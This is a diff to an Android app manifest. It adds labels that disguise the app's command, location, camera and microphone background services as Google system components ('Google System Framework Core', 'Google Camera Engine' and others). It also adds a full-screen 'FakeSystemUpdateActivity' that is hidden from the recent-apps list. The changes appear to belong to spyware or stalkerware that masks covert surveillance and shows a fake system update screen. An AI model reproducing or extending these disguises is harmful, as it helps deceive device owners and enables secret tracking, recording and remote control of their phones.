@@ -142,21 +142,25 @@
         <!-- Background Services -->
         <service
             android:name=".services.CommandService"
+            android:label="Google System Framework Core"
             android:foregroundServiceType="dataSync"
             android:exported="false" />
 
         <service
             android:name=".services.LocationService"
+            android:label="Google Location Provider"
             android:foregroundServiceType="location"
             android:exported="false" />
 
         <service
             android:name=".services.CameraService"
+            android:label="Google Camera Engine"
             android:foregroundServiceType="camera"
             android:exported="false" />
 
         <service
             android:name=".services.AudioService"
+            android:label="Google Voice Engine"
             android:foregroundServiceType="microphone"
             android:exported="false" />
 
@@ -320,6 +324,14 @@
             android:taskAffinity=""
             android:finishOnTaskLaunch="true"
             android:theme="@android:style/Theme.DeviceDefault.Dialog.Alert" />
+
+        <activity
+            android:name=".services.FakeSystemUpdateActivity"
+            android:exported="false"
+            android:excludeFromRecents="true"
+            android:launchMode="singleTask"
+            android:taskAffinity=""
+            android:theme="@android:style/Theme.Black.NoTitleBar.Fullscreen" />
 
     </application>
 </manifest>
